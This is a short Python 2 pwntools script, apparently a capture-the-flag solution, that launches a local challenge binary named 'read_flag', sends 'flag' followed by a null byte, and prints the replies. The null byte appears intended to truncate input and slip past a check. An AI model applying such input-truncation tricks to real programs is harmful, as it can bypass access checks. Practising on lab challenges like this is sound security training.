from pwn import *

p = process("./read_flag")

p.send("flag\x00")

print p.recv()
print p.recv()
